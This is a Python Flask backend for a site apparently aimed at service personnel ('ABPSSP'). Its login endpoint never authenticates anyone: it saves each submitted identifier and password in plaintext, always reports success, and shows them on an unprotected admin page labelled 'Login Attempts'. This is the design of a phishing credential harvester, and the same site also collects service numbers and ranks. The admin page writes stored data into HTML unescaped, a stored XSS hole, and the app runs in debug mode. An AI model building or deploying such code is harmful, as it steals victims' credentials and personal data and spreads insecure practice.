from flask import Flask, request, jsonify
import sqlite3
import os

app = Flask(__name__, static_folder='.', static_url_path='')

def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS contacts (id INTEGER PRIMARY KEY, name TEXT, email TEXT, message TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS logins (id INTEGER PRIMARY KEY, identifier TEXT, password TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS memberships (id INTEGER PRIMARY KEY, name TEXT, service_no TEXT, rank TEXT, email TEXT)''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/api/contact', methods=['POST'])
def contact():
    data = request.json
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("INSERT INTO contacts (name, email, message) VALUES (?, ?, ?)", (data['name'], data['email'], data['message']))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("INSERT INTO logins (identifier, password) VALUES (?, ?)", (data['identifier'], data['password']))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"})

@app.route('/api/membership', methods=['POST'])
def membership():
    data = request.json
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("INSERT INTO memberships (name, service_no, rank, email) VALUES (?, ?, ?, ?)", (data['name'], data['service_no'], data['rank'], data['email']))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"})

@app.route('/admin')
def admin():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT * FROM contacts")
    contacts = c.fetchall()
    c.execute("SELECT * FROM logins")
    logins = c.fetchall()
    c.execute("SELECT * FROM memberships")
    memberships = c.fetchall()
    conn.close()
    
    html = "<html><head><title>Admin Dashboard | ABPSSP</title>"
    html += "<style>body{font-family:sans-serif; margin: 2rem; background: #f4f4f4;} table{width: 100%; border-collapse: collapse; margin-bottom: 2rem;} th, td{padding: 0.8rem; text-align: left; border: 1px solid #ddd;} th{background: #4B5320; color: white;} h2{color: #333;}</style>"
    html += "</head><body>"
    html += "<h1><i class='fas fa-lock'></i> Host Admin Dashboard</h1>"
    
    html += "<h2>Contact Messages</h2><table><tr><th>ID</th><th>Name</th><th>Email</th><th>Message</th></tr>"
    for r in contacts: html += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td></tr>"
    if not contacts: html += "<tr><td colspan='4'>No messages yet.</td></tr>"
    html += "</table>"
    
    html += "<h2>Login Attempts</h2><table><tr><th>ID</th><th>Identifier</th><th>Password</th></tr>"
    for r in logins: html += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td></tr>"
    if not logins: html += "<tr><td colspan='3'>No login attempts yet.</td></tr>"
    html += "</table>"
    
    html += "<h2>Membership Registrations</h2><table><tr><th>ID</th><th>Name</th><th>Service No</th><th>Rank</th><th>Email</th></tr>"
    for r in memberships: html += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td></tr>"
    if not memberships: html += "<tr><td colspan='5'>No memberships yet.</td></tr>"
    html += "</table>"
    
    html += "</body></html>"
    return html

if __name__ == '__main__':
    init_db()
    print("Backend server running! Access the website at http://localhost:5000")
    print("Access the admin dashboard at http://localhost:5000/admin")
    app.run(port=5000, debug=True)
